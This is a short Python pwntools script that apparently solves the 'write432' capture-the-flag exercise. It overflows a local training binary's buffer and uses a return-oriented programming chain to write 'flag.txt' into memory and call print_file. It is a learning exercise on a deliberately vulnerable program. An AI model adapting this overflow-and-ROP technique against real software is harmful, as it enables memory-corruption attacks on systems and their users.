from pwn import *

pr = process("./write432")
elf = ELF("./write432")

'''
readelf -a write432
Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [19] .init_array       INIT_ARRAY      08049efc 000efc 000004 04  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f00 000f00 000004 04  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049f04 000f04 0000f8 08  WA  6   0  4
  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4
  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1

  0x08048543: mov dword ptr [edi], ebp; ret;

'''
print_file = p32(elf.sym["print_file"])
pop = p32(0x080485aa)
mov = p32(0x08048543) #8048543
dynamic = 0x08049f04 + 0x000f04
fluff = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"

# put what we want to call in dynamic memory
payload = fluff + pop + p32(dynamic) + "flag" + mov + pop + p32(dynamic+4) + ".txt" + mov
# call function with start of dynamic memry as our param
payload += print_file + "AAAA" + p32(dynamic)

pr.sendline(payload)
print pr.recv()
